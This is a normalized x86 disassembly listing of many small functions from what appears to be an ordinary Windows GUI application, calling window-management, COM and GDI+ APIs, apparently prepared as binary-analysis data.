add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_40228f
mov eax [ ebp - 0x14 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_402c00
push 0x8007000e
call sub_402d00
sub_403590
xor eax eax
retn 0x10
sub_4035a0
mov [ ecx + 0x8 ] 0x1
retn
sub_4035b0
retn 0x20
sub_405190
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
retn 0x4
sub_4051b0
mov eax [ ecx + 0x50 ]
retn
sub_405f40
push ecx
call [ VariantClear@IAT ]
retn
sub_406400
sub [ esp + 0x4 ] 0x4
jmp sub_408ae0
sub_406410
sub [ esp + 0x4 ] 0x4
jmp sub_408b10
sub_406420
sub [ esp + 0x4 ] 0x4
jmp sub_408b40
sub_406430
mov eax 0x80004001
retn 0x10
sub_4064f0
mov eax 0x80004001
retn 0x4
sub_406500
sub [ esp + 0x4 ] 0x8
jmp sub_408ae0
sub_406510
sub [ esp + 0x4 ] 0x8
jmp sub_408b10
sub_406520
sub [ esp + 0x4 ] 0x8
jmp sub_408b40
sub_406560
mov eax 0x80004001
retn 0x8
sub_406570
xor eax eax
retn 0x4
sub_4065c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ eax + 0x6c ] 0x2
xor eax eax
pop ebp
retn 0x4
sub_4066a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
pop ebp
retn 0x4
sub_406790
xor eax eax
retn 0xc
sub_4067a0
mov eax 0x1
retn 0xc
sub_4069ec
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_406f00
mov eax sub_406de0
retn
sub_407080
xor eax eax
retn 0x8
sub_407090
mov eax 0x800401a1
retn 0x8
sub_40723c
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_407400
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and [ eax + 0x6c ] 0xfffffffd
xor eax eax
pop ebp
retn 0x8
sub_4075b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x9c ]
not eax
and eax 0x1
pop ebp
retn 0x4
sub_4075d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x6c ]
shr eax 0x4
not eax
and eax 0x1
pop ebp
retn 0x4
sub_407630
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x6c ]
shr eax 0x5
not eax
and eax 0x1
pop ebp
retn 0x4
sub_407650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shl ecx 0x5
xor ecx [ eax + 0x6c ]
and ecx 0x20
xor [ eax + 0x6c ] ecx
xor eax eax
pop ebp
retn 0x8
sub_407860
sub [ esp + 0x4 ] 0xc
jmp sub_408ae0
sub_407870
sub [ esp + 0x4 ] 0xc
jmp sub_408b10
sub_407880
sub [ esp + 0x4 ] 0xc
jmp sub_408b40
sub_4078c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shl ecx 0x5
xor ecx [ eax + 0x68 ]
and ecx 0x20
xor [ eax + 0x68 ] ecx
xor eax eax
pop ebp
retn 0x8
sub_4078e0
sub [ esp + 0x4 ] 0x10
jmp sub_408ae0
sub_4078f0
sub [ esp + 0x4 ] 0x10
jmp sub_408b10
sub_407900
sub [ esp + 0x4 ] 0x10
jmp sub_408b40
sub_407910
mov eax 0x80004001
retn 0x14
sub_407940
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x18 ]
mov eax [ eax + 0x18 ]
pop ebp
retn 0x4
sub_407a80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
xor eax eax
pop ebp
retn 0x4
sub_407bbc
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_407c5d
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_408098
mov [ ebp - 0x4 ] 0xffffffff
mov eax sub_4080a5
retn
sub_408130
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shl ecx 0x7
xor ecx [ eax + 0x64 ]
and ecx 0x80
xor [ eax + 0x64 ] ecx
xor eax eax
pop ebp
retn 0x8
sub_408150
sub [ esp + 0x4 ] 0x14
jmp sub_408ae0
sub_408160
sub [ esp + 0x4 ] 0x14
jmp sub_408b10
sub_408170
sub [ esp + 0x4 ] 0x14
jmp sub_408b40
sub_4082c0
sub ecx 0x38
jmp sub_408260
sub_4082d0
sub [ esp + 0x4 ] 0x1c
jmp sub_408ae0
sub_4082e0
sub [ esp + 0x4 ] 0x1c
jmp sub_408b10
sub_4082f0
sub [ esp + 0x4 ] 0x1c
jmp sub_408b40
sub_408340
sub [ esp + 0x4 ] 0x20
jmp sub_408ae0
sub_408350
sub [ esp + 0x4 ] 0x20
jmp sub_408b10
sub_408360
sub [ esp + 0x4 ] 0x20
jmp sub_408b40
sub_408370
retn 0x4
sub_408380
sub [ esp + 0x4 ] 0x24
jmp sub_408ae0
sub_408390
sub [ esp + 0x4 ] 0x24
jmp sub_408b10
sub_4083a0
sub [ esp + 0x4 ] 0x24
jmp sub_408b40
sub_408b00
sub [ esp + 0x4 ] 0x28
jmp sub_408ae0
sub_408b10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
pop ebp
retn 0x4
sub_408b30
sub [ esp + 0x4 ] 0x28
jmp sub_408b10
sub_408b40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop ebp
retn 0x4
sub_408b60
sub [ esp + 0x4 ] 0x28
jmp sub_408b40
sub_408b70
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_408e30
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_408ebc
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_409126
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4095d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor ecx [ eax + 0x7c ]
and ecx 0x1
xor [ eax + 0x7c ] ecx
xor eax eax
pop ebp
retn 0x8
sub_409e30
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ecx ] ax
pop ebp
retn 0x8
sub_409fc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x98 ] ecx
xor eax eax
pop ebp
retn 0x8
sub_40a010
push ebp
mov ebp esp
movsx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
shl ecx 0x5
xor ecx [ eax + 0x7c ]
and ecx 0x20
xor [ eax + 0x7c ] ecx
xor eax eax
pop ebp
retn 0x8
sub_40a060
push ebp
mov ebp esp
movsx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
shl ecx 0x6
xor ecx [ eax + 0x7c ]
and ecx 0x40
xor [ eax + 0x7c ] ecx
xor eax eax
pop ebp
retn 0x8
sub_40a440
mov eax [ eax ]
test eax eax
je r-xdata
retn
push eax
call sub_443ef4
sub_40aaa0
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40ab00
mov ecx [ eax ]
push ecx
call [ SysFreeString@IAT ]
retn
sub_40b2c5
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40bee0
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40c2e0
mov ecx [ eax + 0x4 ]
push ecx
call [ operator delete@IAT ]
pop ecx
retn
sub_40d074
int3
sub_40d9e0
sub ecx 0x1ac
jmp sub_40c900
sub_40d9f0
sub ecx 0x154
jmp sub_40c900
sub_40da00
sub ecx 0x1a4
jmp sub_40c900
sub_40da10
sub ecx 0x70
jmp sub_40c900
sub_40ddd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
mov edx [ ecx + 0x140 ]
push edx
add ecx 0x134
push ecx
call sub_419e00
sub_40de30
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
pop ebp
retn 0x4
lea eax [ ecx + 0x134 ]
mov ecx [ ecx + 0x140 ]
push eax
call sub_419ed0
sub_40df80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax 0x1
pop ebp
retn 0x4
sub_40e2a0
xor eax eax
retn
sub_40e2e0
mov [ ecx ] r--data
retn
sub_40e320
mov [ ecx ] r--data
retn
sub_40e460
mov [ ecx ] r--data
retn
sub_40e470
mov al 0x1
mov [ ecx + 0x24 ] al
retn 0x4
sub_40e480
xor al al
mov [ ecx + 0x24 ] al
mov [ ecx + 0x29 ] 0x0
retn
sub_40e530
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x4 ] 0x0
sub_40e5a0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
xor dl dl
mov [ ecx + 0x24 ] al
cmp al dl
jne r-xdata
pop ebp
retn 0x4
mov [ ecx + 0x29 ] dl
mov [ ecx + 0x2a ] dl
sub_40e5c0
xor al al
retn 0xc
sub_40e5d0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x27 ] al
pop ebp
retn 0x4
sub_40e600
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x26 ] al
pop ebp
retn 0x4
sub_40e610
cmp [ ecx + 0x24 ] 0x0
je r-xdata
xor al al
retn
mov al [ ecx + 0x26 ]
retn
sub_40e620
mov al [ ecx + 0x2a ]
retn
sub_40e930
mov [ ecx ] r--data
retn
sub_40ebd0
mov eax 0x1
retn
sub_40ebe0
mov eax [ ecx + 0x4 ]
jmp sub_422610
sub_40ec40
push ebp
mov ebp esp
mov ecx [ ecx + 0x4 ]
pop ebp
jmp sub_422680
sub_40edb0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
pop ebp
jmp sub_425430
sub_40f3c0
add ecx 0x8
push ecx
call [ InterlockedIncrement@IAT ]
retn
sub_40f3d0
add ecx 0x8
push ecx
call [ InterlockedDecrement@IAT ]
retn
sub_40f3e0
mov eax [ ecx + 0x8 ]
retn
sub_40f450
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push r--data
push r--data
push eax
call edx
pop ebp
retn 0x4
sub_40f470
mov eax 0x80004005
retn 0x10
sub_40f760
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40f480
pop ebp
retn 0x10
sub_40f780
mov eax 0x80004001
retn 0xc
sub_40f9a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
add esi 0x4
call sub_40f910
pop esi
pop ebp
retn 0x4
sub_40faa0
mov eax [ esi ]
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
mov [ esi ] 0x0
retn
sub_40fc01
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40fc61
mov [ ebp - 0x4 ] 0x2
mov eax r-xdata
retn
sub_40fe70
mov ecx [ eax + 0x8 ]
push ecx
call [ CoTaskMemFree@IAT ]
retn
sub_4105d0
lea ecx [ eax + 0x4 ]
cmp [ eax ] ecx
je r-xdata
retn
jmp sub_410570
sub_410741
mov [ ebp - 0x4 ] 0x4
mov eax r-xdata
retn
sub_4109a0
mov [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
sub_411ad6
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_411c6e
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_411dc0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_4121d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_411f00
pop ebp
retn 0x10
sub_412480
push esi
mov esi ecx
call [ GetTickCount@IAT ]
push 0x0
push 0x64
push eax
mov eax [ esi + 0x1b0 ]
push eax
call [ SetTimer@IAT ]
mov [ esi + 0x2cc ] eax
pop esi
retn
sub_412560
push esi
mov esi ecx
call sub_415040
cmp [ esi + 0x28 ] 0x0
pop esi
jne r-xdata
retn
jmp sub_422c90
sub_412870
mov ecx [ eax + 0x1b0 ]
push 0x0
push 0xf060
push 0x112
push ecx
call [ PostMessageW@IAT ]
retn
sub_412890
xor eax eax
retn 0x18
sub_4128a0
sub ecx 0x1ac
jmp sub_4122f0
sub_4128b0
sub ecx 0x154
jmp sub_4122f0
sub_4128c0
sub ecx 0x1a4
jmp sub_4122f0
sub_4128d0
sub ecx 0x70
jmp sub_4122f0
sub_412940
retn
sub_412c90
mov al 0x1
retn 0x4
sub_413651
mov eax [ ebp - 0x14 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_413960
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_4142c0
sub ecx 0x70
jmp sub_413c30
sub_414a20
push ebp
mov ebp esp
cmp [ ecx + 0x25 ] 0x0
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0xfc ]
pop ebp
jmp edx
mov eax [ ecx ]
mov eax [ eax + 0x100 ]
pop ebp
jmp eax
sub_415030
mov [ ecx + 0x24 ] 0x0
retn
sub_4151d0
retn 0x14
sub_415310
mov eax [ ecx + 0x1b0 ]
push 0x0
push 0xf020
push 0x112
push eax
call [ SendMessageW@IAT ]
retn
sub_4153d0
mov eax [ ecx + 0x1b0 ]
push 0x0
push 0xf060
push 0x112
push eax
call [ PostMessageW@IAT ]
retn
sub_4153f0
mov eax [ ecx + 0x1ec ]
cmp [ eax + 0x1a0 ] 0x0
setne al
retn
sub_415460
push ebp
mov ebp esp
pop ebp
jmp sub_4191b0
sub_4162f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx + 0x10 ] 0x2
setne al
pop ebp
retn 0x4
sub_4164f0
retn 0x8
sub_416720
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop ebp
retn 0xc
sub_416910
cmp [ ecx + 0x285 ] 0x0
jne r-xdata
mov eax [ ecx + 0x1b0 ]
push eax
call [ IsZoomed@IAT ]
neg eax
sbb eax eax
inc eax
retn
xor eax eax
retn
sub_417500
sub ecx 0x70
jmp sub_414790
sub_417510
sub ecx 0x1ac
jmp sub_414790
sub_417520
sub ecx 0x154
jmp sub_414790
sub_417530
sub ecx 0x1a4
jmp sub_414790
sub_417650
mov eax 0x1
retn 0x4
sub_418470
mov [ ecx + 0xcc ] 0x1
retn
sub_4186a0
sub ecx 0x70
jmp sub_417540
sub_418ac0
sub ecx 0x70
jmp sub_418760
sub_419730
mov [ ecx + 0x1a0 ] 0x0
retn
sub_419740
test ecx ecx
je r-xdata
xor eax eax
retn
lea eax [ ecx + 0x70 ]
retn
sub_4197a0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + 0xb8 ]
pop ebp
retn 0x4
mov eax [ rw-data ]
mov eax [ eax + 0xb4 ]
pop ebp
retn 0x4
sub_4197d0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x120 ]
pop ebp
retn 0x4
mov eax [ ecx + 0x11c ]
pop ebp
retn 0x4
sub_419860
push esi
mov esi ecx
cmp [ esi + 0x1d0 ] 0x0
je r-xdata
pop esi
retn 0x4
call [ ReleaseCapture@IAT ]
mov [ esi + 0x1d0 ] 0x0
sub_4198b0
sub ecx 0x1a4
jmp sub_418c20
sub_4198c0
sub ecx 0x70
jmp sub_418c20
sub_4198d0
sub ecx 0x1ac
jmp sub_418c20
sub_4198e0
sub ecx 0x154
jmp sub_418c20
sub_4199f0
sub ecx 0x70
jmp sub_419920
sub_419ab0
mov [ ecx ] r--data
retn
sub_41af70
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_41b0b0
mov eax [ ecx + 0x4 ]
push eax
mov [ ecx ] r--data
call [ GdipDeleteBrush@IAT ]
retn
sub_41b280
push eax
call [ GdipFree@IAT ]
retn
sub_41b290
mov ecx [ eax ]
push ecx
call [ GdipDeleteGraphics@IAT ]
retn
sub_41b2a0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
mov [ ecx ] 0x0
call [ DeleteDC@IAT ]
sub_41d1d0
push 0xffffffeb
push eax
call [ GetWindowLongW@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_41d140
sub_41eeb0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
sub_41f4cd
mov edx [ ebp - 0x14 ]
push edx
call [ operator delete@IAT ]
add esp 0x4
xor edx edx
push edx
push edx
call _CxxThrowException
sub_41f4f0
mov eax [ esi ]
test eax eax
je r-xdata
retn
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_41f580
or eax 0xffffffff
retn 0xc
sub_41f5c0
mov [ ecx ] r--data
retn
sub_421e10
sub ecx 0x14
jmp sub_421d70
sub_421e20
sub ecx 0x34
jmp sub_421d70
sub_421e30
sub ecx 0x40
jmp sub_421d70
sub_421e70
mov [ ecx ] r--data
retn
sub_422110
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
pop ebp
jmp eax
sub_422140
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
pop ebp
jmp eax
sub_422220
mov [ ecx ] r--data
retn
sub_422510
add ecx 0xffffffc0
jmp sub_428340
sub_422600
push 0x0
call [ PostQuitMessage@IAT ]
retn
j_sub_422c90
jmp sub_422c90
sub_423fc0
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
pop ebp
jmp eax
sub_4256b0
sub ecx 0x40
jmp sub_4223b0
sub_4256c0
sub ecx 0x14
jmp sub_4223b0
sub_4256d0
sub ecx 0x34
jmp sub_4223b0
sub_425f50
sub ecx 0x14
jmp sub_425810
sub_425f60
sub ecx 0x34
jmp sub_425810
sub_425f70
sub ecx 0x40
jmp sub_425810
sub_426280
sub ecx 0x14
jmp sub_426020
sub_426290
sub ecx 0x34
jmp sub_426020
sub_4262a0
sub ecx 0x40
jmp sub_426020
sub_4263b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x6
jne r-xdata
push eax
call sub_418630
pop ebp
retn 0x4
mov [ ecx + 0xec ] eax
sub_4263d0
mov al 0x1
mov [ ecx + 0x24 ] al
mov [ ecx + 0x26 ] al
retn 0x4
sub_426490
push ebp
mov ebp esp
cmp [ ecx + 0xf0 ] 0x0
je r-xdata
pop ebp
jmp sub_412d80
xor eax eax
pop ebp
retn 0x4
sub_4266f0
push esi
mov esi ecx
call sub_4177c0
pop esi
retn 0x4
sub_426700
sub ecx 0x70
jmp sub_426340
sub_426710
sub ecx 0x154
jmp sub_426340
sub_426b0e
mov esi [ ebp + 0x8 ]
call sub_439510
push 0x0
push 0x0
call _CxxThrowException
sub_426b93
xor ebx ebx
push ebx
push ebx
call _CxxThrowException
sub_426c80
mov eax ecx
cmp [ eax + 0x25 ] 0x0
jne r-xdata
retn 0x4
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x54 ]
call eax
sub_426e60
mov [ ecx + 0x29 ] 0x1
retn
sub_426e70
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x2a ] al
pop ebp
retn 0x4
sub_426f30
sub ecx 0x70
jmp sub_426ba0
sub_426f70
mov [ ecx ] r--data
retn
sub_426f80
xor eax eax
retn 0x14
sub_426fc0
mov [ ecx ] r--data
retn
sub_42773c
int3
sub_427b20
sub ecx 0x70
jmp sub_427170
sub_42a6ea
mov ecx [ ebp - 0x14 ]
push ecx
call [ operator delete@IAT ]
add esp 0x4
xor ebx ebx
push ebx
push ebx
call _CxxThrowException
sub_42ace0
sub ecx 0x70
jmp sub_42a7f0
sub_42b380
sub ecx 0x70
jmp sub_42adb0
sub_42b650
sub ecx 0x154
jmp sub_42b410
sub_42b660
sub ecx 0x70
jmp sub_42b410
sub_42b8b0
push ebp
mov ebp esp
pop ebp
jmp sub_40e4c0
sub_42b8c0
mov eax ecx
cmp [ eax + 0x25 ] 0x0
mov [ eax + 0x24 ] 0x1
jne r-xdata
retn 0x4
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
push eax
mov eax [ edx + 0x54 ]
call eax
sub_42bd60
push ebp
mov ebp esp
cmp [ ecx - 0x54 ] 0x0
je r-xdata
pop ebp
retn 0x4
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
pop ebp
jmp eax
sub_42bed0
push ebp
mov ebp esp
cmp [ ecx - 0x54 ] 0x0
je r-xdata
pop ebp
retn 0x10
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x38 ]
pop ebp
jmp eax
sub_42bef0
push ebp
mov ebp esp
cmp [ ecx - 0x54 ] 0x0
je r-xdata
pop ebp
retn 0x4
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x3c ]
pop ebp
jmp eax
sub_42bf10
push ebp
mov ebp esp
cmp [ ecx - 0x54 ] 0x0
je r-xdata
pop ebp
retn 0x4
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x40 ]
pop ebp
jmp eax
sub_42bf30
push ebp
mov ebp esp
cmp [ ecx - 0x54 ] 0x0
je r-xdata
pop ebp
retn 0x4
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov eax [ eax + 0x44 ]
pop ebp
jmp eax
sub_42c0a0
sub ecx 0x154
jmp sub_42b790
sub_42c0b0
sub ecx 0x70
jmp sub_42b790
sub_42c2d0
push ebp
mov ebp esp
cmp [ ecx + 0x25 ] 0x0
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0xc8 ]
pop ebp
jmp edx
mov eax [ ecx ]
mov eax [ eax + 0xcc ]
pop ebp
jmp eax
sub_42c6a0
xor al al
mov [ ecx + 0x24 ] al
mov [ ecx + 0x29 ] 0x0
lea eax [ ecx + 0x70 ]
jmp sub_412ec0
sub_42c9d0
mov ecx [ ecx - 0x54 ]
mov eax [ ecx ]
mov edx [ eax + 0x2c ]
jmp edx
sub_42d100
sub ecx 0x1a4
jmp sub_42c160
sub_42d110
sub ecx 0x70
jmp sub_42c160
sub_42d120
sub ecx 0x1ac
jmp sub_42c160
sub_42d130
sub ecx 0x154
jmp sub_42c160
sub_42d610
sub ecx 0x70
jmp sub_42d1d0
sub_42db20
sub ecx 0x70
jmp sub_42d6c0
sub_42de20
sub ecx 0x70
jmp sub_42dba0
sub_42e1d0
sub ecx 0x70
jmp sub_42dea0
sub_42e2f0
sub ecx 0x70
jmp sub_42e260
sub_42e510
sub ecx 0x70
jmp sub_42e390
sub_42e590
sub ecx 0x70
jmp sub_42e520
sub_42e800
sub ecx 0x70
jmp sub_42e720
sub_42e810
sub ecx 0x74
jmp sub_42e720
sub_42f060
sub ecx 0x70
jmp sub_42e8e0
sub_42f4f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
pop ebp
retn 0x8
sub_430720
sub ecx 0x70
jmp sub_42f3b0
sub_430730
sub ecx 0x74
jmp sub_42f3b0
sub_430be8
int3
sub_431770
sub ecx 0x70
jmp sub_430820
sub_431780
sub ecx 0x74
jmp sub_430820
sub_431c60
sub ecx 0x70
jmp sub_431810
sub_432350
push edi
mov edi ecx
call sub_432000
mov ecx edi
pop edi
jmp sub_42c6c0
sub_432f30
sub ecx 0x1ac
jmp sub_431d70
sub_432f40
sub ecx 0x154
jmp sub_431d70
sub_432f50
sub ecx 0x1a4
jmp sub_431d70
sub_432f60
sub ecx 0x70
jmp sub_431d70
sub_434000
sub ecx 0x1ac
jmp sub_433050
sub_434010
sub ecx 0x154
jmp sub_433050
sub_434020
sub ecx 0x1a4
jmp sub_433050
sub_434030
sub ecx 0x70
jmp sub_433050
sub_435500
sub ecx 0x70
jmp sub_4341c0
sub_435af0
sub ecx 0x70
jmp sub_435580
sub_435f30
mov eax [ ecx + 0xf8 ]
test eax eax
je r-xdata
retn
push eax
call [ DestroyWindow@IAT ]
sub_436de0
push ebp
mov ebp esp
mov eax [ esi + 0x190 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ KillTimer@IAT ]
mov [ esi + 0x190 ] 0x0
sub_436e10
mov eax [ esi + 0xf8 ]
test eax eax
je r-xdata
mov [ esi + 0x194 ] 0x0
retn
push 0x0
push eax
call [ ShowWindow@IAT ]
sub_436ef0
sub ecx 0x70
jmp sub_435c20
sub_4370b0
sub ecx 0x70
jmp sub_436f80
sub_437340
sub ecx 0x70
jmp sub_437140
sub_4375a0
sub ecx 0x70
jmp sub_4373d0
sub_4379d0
sub ecx 0x70
jmp sub_437660
sub_437cd0
lea eax [ ecx - 0x70 ]
mov ecx [ ecx - 0x54 ]
push eax
push 0x113
call sub_412fd0
retn
sub_437d90
sub ecx 0x70
jmp sub_437a70
sub_438140
sub ecx 0x70
jmp sub_437e40
sub_439510
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_439540
sub ecx 0x1a4
jmp sub_438230
sub_439550
sub ecx 0x70
jmp sub_438230
sub_439560
sub ecx 0x1ac
jmp sub_438230
sub_439570
sub ecx 0x154
jmp sub_438230
sub_43a850
sub ecx 0x1ac
jmp sub_439650
sub_43a860
sub ecx 0x154
jmp sub_439650
sub_43a870
sub ecx 0x1a4
jmp sub_439650
sub_43a880
sub ecx 0x70
jmp sub_439650
sub_43a8c0
mov [ ecx ] r--data
retn
sub_43d0f0
sub ecx 0x14
jmp sub_43b200
sub_43d100
sub ecx 0x34
jmp sub_43b200
sub_43d460
mov [ ecx ] r--data
retn
sub_43e1bd
mov eax [ ebp - 0x14 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_43e770
sub ecx 0x70
jmp sub_43e320
sub_43ed80
mov eax [ ecx + 0x78 ]
test eax eax
je r-xdata
retn
push eax
call [ DestroyWindow@IAT ]
sub_43f8d0
sub ecx 0x74
jmp sub_43e870
sub_43f8e0
sub ecx 0x70
jmp sub_43e870
sub_43fd30
sub ecx 0x24
jmp sub_43fb20
sub_43ff10
retn 0xc
sub_440260
mov eax [ ecx + 0x4 ]
push eax
mov [ ecx ] r--data
